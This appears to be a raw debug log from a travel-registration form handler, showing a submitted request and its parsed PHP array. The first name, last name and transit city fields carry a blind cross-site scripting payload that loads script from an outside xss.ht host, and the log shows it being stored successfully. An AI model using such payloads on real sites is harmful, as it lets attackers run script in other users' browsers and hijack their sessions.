travel_func
"vaccination=yes&vaccination_name=&first_name=Adam%3Cscript+src%3Dhttps%3A%2F%2Fgowin1.xss.ht%3E%3C%2Fscript%3E&last_name=Robinson%3Cscript+src%3Dhttps%3A%2F%2Fgowin1.xss.ht%3E%3C%2Fscript%3E&passport_number=0230454021&email=fexode8884%40deitada.com&nhs_no=&tel=02014+862435&dateofbirth=13%2F01%2F2023&ethnicity=any-other-mixed&sex=male&current_address1=47w13thst&current_address2=3a&current_country=United+States&current_city=NewYork&current_city_post_code=10001&check1_hidden=yes&isolate_address1=&isolate_address2=&isolate_city=&isolate_city_post_code=&isolate_country=&departure_date=19%2F01%2F2023&flight_num=3a&tp_country=United+States&tp_city=ny&tp_airport=dd&transit_stopover%5B0%5D%5Btransit_stopover_country%5D=Australia&transit_stopover%5B0%5D%5Btransit_stopover_city%5D=NewYork%3Cscript+src%3Dhttps%3A%2F%2Fgowin1.xss.ht%3E%3C%2Fscript%3E&transit_stopover%5B0%5D%5Btransit_stopover_airport%5D=&transit_stopover%5B0%5D%5Btransit_stopover_departure_date%5D=&final_arrival_date=13%2F01%2F2023&final_arrival_port=tt&final_arrival_city=tt&final_arrival_flightnum=tt&user_id=0&booking_id=133268"
1 form submitted call
2 registeration id : MOLUK100000
3 User form data Array
(
    [user_id] => 0
    [productID] => 133268
    [registrationID] => MOLUK100000
    [passport] => 0230454021
    [orderID] => 0
    [first_name] => Adam<script src=https://gowin1.xss.ht></script>
    [last_name] => Robinson<script src=https://gowin1.xss.ht></script>
    [email] => fexode8884@deitada.com
    [nhs_no] => 
    [tel] => 02014 862435
    [dateofbirth] => 13/01/2023
    [ethnicity] => any-other-mixed
    [sex] => male
    [current_address1] => 47w13thst
    [current_address2] => 3a
    [current_city] => NewYork
    [current_city_post_code] => 10001
    [current_country] => United States
    [isolate_address1] => 47w13thst
    [isolate_address2] => 3a
    [isolate_city] => NewYork
    [isolate_city_post_code] => 10001
    [isolate_country] => United States
    [departure_date] => 19/01/2023
    [flight_num] => 3a
    [tp_city] => ny
    [tp_country] => United States
    [tp_airport] => dd
    [final_arrival_date] => 13/01/2023
    [final_arrival_port] => tt
    [final_arrival_city] => tt
    [final_arrival_flightnum] => tt
    [vaccination] => yes
    [transit_stopover_data] => default
)

4 inserted id  111676
5 success  
-------------------------
